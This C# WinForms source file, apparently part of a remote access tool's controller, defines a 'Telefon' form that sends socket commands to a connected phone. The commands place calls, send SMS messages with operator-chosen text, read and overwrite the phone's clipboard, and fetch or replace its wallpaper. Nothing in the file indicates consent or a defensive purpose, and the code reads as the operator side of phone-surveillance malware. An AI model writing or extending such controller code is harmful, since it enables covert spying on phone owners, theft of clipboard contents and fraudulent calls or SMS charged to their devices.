using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Telefon : MetroFramework.Forms.MetroForm
    {
        Socket sck;
        public string uniq_id = "";
        public Telefon(Socket sock, string uniq_id_)
        {
            InitializeComponent();
            uniq_id = uniq_id_;
            sck = sock;
            foreach (Control cntrl in metroTabPage1.Controls)
            {
                if (cntrl is Button)
                {
                    if (cntrl.Text != "1" && cntrl.Text != "<=" && cntrl.Text != "Call")
                    {
                        cntrl.Click += new EventHandler(button1_Click);
                    }
                }
            }
            textBox1.TextChanged += textBox1_TextChanged;
            button1.Click += button1_Click;
            button14.Click += button14_Click;
            button13.Click += button13_Click;
            button15.Click += button15_Click;
            button16.Click += button16_Click;
            button17.Click += button17_Click;
            button18.Click += button18_Click;
            button19.Click += button19_Click;
            button20.Click += button20_Click;
            metroTabControl1.SelectedIndex = 0;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text += ((Button)sender).Text;
        }
        int say = 0;
        private void button13_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Length > 0)
            {
                say--;
                textBox1.Text = textBox1.Text.Substring(0, say);

            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("ARA", Encoding.UTF8.GetBytes(textBox1.Text));
                    sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void button15_Click(object sender, EventArgs e)
        {
            if (textBox2.Text != "" && textBox3.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("SMSGONDER", Encoding.UTF8.GetBytes(textBox2.Text + "=" + textBox3.Text));
                    sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            if (textBox4.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("PANOSET", Encoding.UTF8.GetBytes(textBox4.Text));
                    sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void button17_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("PANOGET", Encoding.UTF8.GetBytes("ECHO"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void button19_Click(object sender, EventArgs e)
        {
            try
            {
                pictureBox1.Image = null; label4.Text = "...";
                byte[] senddata = Form1.MyDataPacker("WALLPAPERGET", Encoding.UTF8.GetBytes("ECHO"));
                sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }
        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "Ok";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
        private void button20_Click(object sender, EventArgs e)
        {
            string value = "https://upload.wikimedia.org/wikipedia/tr/5/5a/%C4%B0stemi_Betil.jpg";
            if (InputBox("wallpaper link", "Link:", ref value) == DialogResult.OK)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("WALLPAPERBYTE", Encoding.UTF8.GetBytes(value));
                    sck.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void button18_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog sv = new SaveFileDialog()
            {
                Filter = "Image file|*.png",
                Title = "Save wallpaper",
                FileName = "wallpaper.png"
            })
            {
                if (sv.ShowDialog() == DialogResult.OK)
                {
                    if (pictureBox1.Image != null)
                        pictureBox1.Image.Save(sv.FileName, ImageFormat.Png);
                }
            };
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            say = textBox1.Text.Length;
        }
    }
}
